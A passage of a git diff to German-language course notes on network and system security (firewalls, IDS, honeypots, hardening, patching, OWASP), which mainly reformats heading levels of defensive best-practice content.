     - Gegen Angriffe von innen: Netzverkehr „hinter“ einer Firewall wird nicht überwacht. n Gegen Malware: Schutz kann zwar mit der Funktionalität einer Firewall kombiniert werden, eine Firewall an sich schützt aber nicht vor Malware (dazu braucht es komplexe inhaltliche Analysen).
@@ -2660,7 +2847,7 @@ Firewall - Grenzen
 - Oft geben Firewalls ein falsches Sicherheitsgefühl!
 
 
-###Netzwerkzonierung - einfach
+#### Netzwerkzonierung - einfach
 
 ![](links/2021-01-10_16-07-05.png)  
 
@@ -2672,7 +2859,7 @@ Firewall - Grenzen
     - Dies kann je nach Konzept auch mit einer einzigen Firewalls mit mehreren Interfaces realisiert werden
 
 
-###Netzwerkzonierung - komplex
+#### Netzwerkzonierung - komplex
 
 ![](links/2021-01-10_16-08-06.png)  
 
@@ -2685,7 +2872,7 @@ Firewall - Grenzen
     - Nicht in der Hoheit der Firma, aber als vetrauenswürdig eingstuft ist das Partnernetz, in dem der Finanzdienstleister die Zahlungen des Webshops abwickelt.
 
 
-IDS - Intrusion Detection Systems
+##### IDS - Intrusion Detection Systems
 
 - Viele Einbrüche (und Versuche) werden oft gar nicht erkannt n Schlecht geschützte Netze werden auch nicht überwacht n Netzwerkbetrieb ist anspruchsvoll, laufend Überwachen:
     - Auslastung 
@@ -2698,7 +2885,7 @@ IDS - Intrusion Detection Systems
 - Werden Angriffe nicht nur erkennt, sonder auch automatisch geblockt, spricht man von einem IPS (Intrusion Prevention Systems). Diese Systeme müssen aber sehr sorgfältig geplant und mit Bedacht eingesetzt werden, da sie sonst kontraproduktiv wirken können (DOS Angriffe).
 
 
-Netzwerk basierte IDS
+###### Netzwerk basierte IDS
 
 - Snort ist ein typischer Vertreter der Netzwerk basierten IDS. n Es ist open source und frei verfügbar.
 - Snort kennt folgende Betriebsmodi
@@ -2712,7 +2899,7 @@ Netzwerk basierte IDS
 - Regeln geben zuerst die Netzwerkverbindung an (von innen nach aussen auf einem HTTP Port), danach folgt die Warnmeldung und der zu suchende Ausdruck.
 
 
-Host basierte IDS
+###### Host basierte IDS
 
 - OSSEC ist ein typischer Vertreter eines Host basierten IDS. 
 - Es ist open source und frei verfügbar.
@@ -2726,7 +2913,7 @@ Host basierte IDS
 - OSSEC verfügt über lokale Agents und eine zentrale Management Instanz, welche besonders gut geschützt sein muss. Es ist auch möglich OSSEC mit eingeschränktem Funktionsumfang ohne lokale Agents einzusetzen.
 
 
-Honeypot - Honeynet
+##### Honeypot - Honeynet
 
 ![](links/2021-01-10_16-08-06.png)  
 
@@ -2737,7 +2924,7 @@ Honeypot - Honeynet
 - Honeypots sollten in einem eigenen, speziell gesicherten Netz stehen und so die produktiven Systeme nicht gefährden. Diese Netzsegmentierung sollte für den Angreifer aber nicht erkennbar sein.
 
 
-Best-Practice Massnahmen Netzwerksicherheit
+##### Best-Practice Massnahmen Netzwerksicherheit
 
 - Inventar und Klassifizierung aller Hard- und Software 
 - IP Adressvergabe zeitnah dokumentieren.
@@ -2750,7 +2937,7 @@ Best-Practice Massnahmen Netzwerksicherheit
 - Konfigurationen von Routern, Layer-3 Switches und Firewalls gehören auch ins Backup!
 
 
-Best Practice Firewall Policy
+##### Best Practice Firewall Policy
 
 - Einhalten von Least Privilege bei der Vergabe von Firewall Rules. Es sollten nur einzelne Ports und diese nur für Punkt zu Punkt Verbindungen erlaubt werden. Wird davon abgewichen, müssen kompensierende Massnahmen getroffen werden.
 - Eingehende Verbindungen:
@@ -2761,7 +2948,7 @@ Best Practice Firewall Policy
 - Regelmässiges Audit der Firewall-Regeln.
 
 
-Wireless LAN
+##### Wireless LAN
 
 - Kein Wireless-LAN in sehr heiklen Netzwerkzonen.
 - Ändern Sie die Default-Passwörter der Access-Points! n Kein Broadcast der ESSID.
@@ -2771,16 +2958,16 @@ Wireless LAN
 - WPA2 Verschlüsselung n Gegenseitige Geräte-Authentisierung (EAP).
 
 
-Organisatorische Massnahmen
+##### Organisatorische Massnahmen
 
 - Erlassen Sie ein Nutzungsrichtlinie (Benutzung Internet, Email, Hard- und Software, PDA, Speichermedien, Smartphone) und kommunizieren Sie diese den Mitarbeitenden.
 - Bestimmen Sie die Verantwortlichkeiten für den Betrieb (inkl. Stellvertretungsregelung) des Netzes.
 - Prozess für die Änderung und Produktivsetzung von Firewall-Regeln einführen
 
 
-Systemsicherheit
+#### Systemsicherheit
 
-Bedrohungen der Systemsicherheit
+##### Bedrohungen der Systemsicherheit
 
 - Systemsicherheit beinhaltet die Sicherheit
     - Des Betriebssystems 
@@ -2799,7 +2986,7 @@ Bedrohungen der Systemsicherheit
     - Rootkits: Klinken sich sehr früh in den Startprozess eines OS ein, so dass sie im laufenden Betrieb nicht erkannt werden können.
 
 
-Viren- und Spamschutz
+##### Viren- und Spamschutz
 
 - Ohne einen gut konfigurierten und aktuellen Viren- und Spamschutz lässt sich kaum mehr arbeiten.
 - Der Viren- und Spamfilter muss ebenfalls mehrstufig eingebaut sein. Falls möglich, sollte auf dem äusseren Schutzring ein anderes Produkt als auf dem Endgerät verwendet werden.
@@ -2810,7 +2997,7 @@ Viren- und Spamschutz
 - Um Geräte im Firmenumfeld zu schützen, braucht es nebst einer Definitive Software Library auch einen Schutz der Programme. So bietet sich eine digitale Signatur an, um nur autorisierte Software auszuführen.
 
 
-Grenzen des Virenschutzes
+##### Grenzen des Virenschutzes
 
 - Der Viren- und Spamschutz hat aber enge Grenzen in seinen Möglichkeiten:
     - Gezielte Angriffe können in der Regel nur schlecht erkannt werden.
@@ -2819,7 +3006,7 @@ Grenzen des Virenschutzes
     - Es gibt jeden Monat einige Tausend Malware Varianten, die von keinem einzigen AV Hersteller erkannt werden (s. Grafik nächste Folie)
 
 
-Online Malware Analyse
+##### Online Malware Analyse
 
 - VirusTotal (http://www.virustotal.com) scannt eine hochgeladene Datei mit verschiedenen Antivirenprodukten und zeigt, welche Produkte die Datei als Malware einstufen.
 - Ein ähnliches Produkt ist htp://virusscan.jotti.org/de 
@@ -2831,7 +3018,7 @@ Online Malware Analyse
     - http://wepawet.iseclab.org/
 
 
-###System Härtung
+#### System Härtung
 
 - Unter der Härtung eines Systems wird die Reduktion der Angriffsfläche verstanden.
 - Dienstebene:
@@ -2860,7 +3047,7 @@ Online Malware Analyse
     - Harddisk Verschlüsselung (insbes. bei mobilen Geräten)
 
 
-Server Dienste
+##### Server Dienste
 
 - Serverdienste müssen ebenfalls sicher konfiguriert und geschützt werden
     - Besonders wichtig ist dies für Dienste, die von aussen erreichbar sind 
@@ -2869,7 +3056,7 @@ Server Dienste
     - Es sollte nur die notwendige Funktionalität freigeschaltet werden
 
 
-Security Lifecycle
+##### Security Lifecycle
 
 - Systeme müssen einen Sicherheits Life Cycle haben, der regelmässig geprüft wird, damit die initiale Sicherheit aufrecht erhalten werden kann.
 - Einsetzen von Checklisten bei der Installation und im Betrieb.
@@ -2878,7 +3065,7 @@ Security Lifecycle
 - Ein System, das nicht mehr gebraucht wird, muss auch ausser Betrieb genommen werden.
 
 
-###Patching
+#### Patching
 
 - Unter dem Patching von Systemen versteht man das Applizieren von (Security) Patches, welche eine Sicherheitslücke schliessen. Das Einspielen von Patches reduziert nicht die Auswirkung eines Angriffes, aber die Eintretenswahrscheinlichkeit.
     - Einzelne Szenarien können eine Firma an den Rand des Ruins führen (z.B. ein Hacker Angriff auf interne Systeme oder eine Wurminfektion epidemischen Ausmasses).
@@ -2906,36 +3093,36 @@ Kriterien zur Beurteilung
     - http://nvd.nist.gov/home.cfm n http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
 
 
-###Systemhärtung
+#### Systemhärtung
 
-Nutzen der Systemhärtung
+##### Nutzen der Systemhärtung
 
 - Auf einem gehärteten System laufen in der Regel nur 10 – 30% der Dienste, die auf einer Default Installation aktiv sind.
 - Die Rechtevergabe ist so, dass in der Regel nur ein Minimum von Personen Zugriff auf Daten hat, alle zusätzlichen Zugriffe müssen explizit freigegeben werden. Dies führt dazu, dass ein Angreifer, der via eine verwundbare Applikation auf ein System gelangt, zuerst versuchen muss, seine Privilegien zu erhöhen.
 - Ein gehärtetes System gewährleistet einen guten Grundschutz n Für erhöhten Schutzbedarf sind allerdings zusätzliche Massnahmen wie Mandatory Access Controls, regelmässige Integritätsprüfungen und speziell gehärtete Betriebssystem Kernel, sowie eine netzmässige Isolierung notwendig.
 
 
-Microsoft Plattform
+##### Microsoft Plattform
 
 - Microsoft bietet eine Vielzahl an Hilfsmitteln zum System Hardening
 - Baseline und Best Practice Analyzers n Security Guidelines
 - Templates für das Hardening von Systemen n Im Active Directory Umfeld können (fast) alle Settings direkt im AD gemacht und via Group Policies auf alle oder auf ein bestimmtes Subset von Systemen appliziert werden.
 
 
-Unix Plattformen
+##### Unix Plattformen
 
 - Es gibt diverse Guidelines und Hilfsmittel für die Härtung von Unix
 - Debian: http://www.debian.org/doc/manuals/securing-debian-howto/ n Red Hat: http://www.nsa.gov/ia/_files/os/redhat/rhel5-guide-i731.pdf n SE Linux oder AppArmor für mandatory access control n Für Solaris: http://www.nsa.gov/ia/_files/os/sunsol_9/I331-007R-2004.pdf n OSX: http://www.nsa.gov/ia/_files/factsheets/macosx_hardening_tips.pdf
 
 
-System- und Netzwerksicherheit und OWASP
+##### System- und Netzwerksicherheit und OWASP
 
 - In den OWASP Top 10 sind folgende Problempunkte, welche auch einen direkten Einfluss auf die System- und Netzwerksicherheit haben können:
 - IAM relevante OWASP Vulnerabilities wie A2 (Broken Authentication and Session Management) n Konfigurationsfehler (A6 Security Misconfiguration) n Fehler bei der Verwendung von Kryptographie (A6 Sensitive Data Exposure) n Unverschlüsselte Netzwerkverbindungen (A6 Sensitive Data Exposure)
 
 
 
-#### Nachbearbeitung
+### Nachbearbeitung
 
 SSL:
 
@@ -2949,7 +3136,7 @@ https://de.wikipedia.org/wiki/Kerckhoffs%E2%80%99_Prinzip
 
 
 
-#Musterprüfung
+# Musterprüfung
 
 1
 
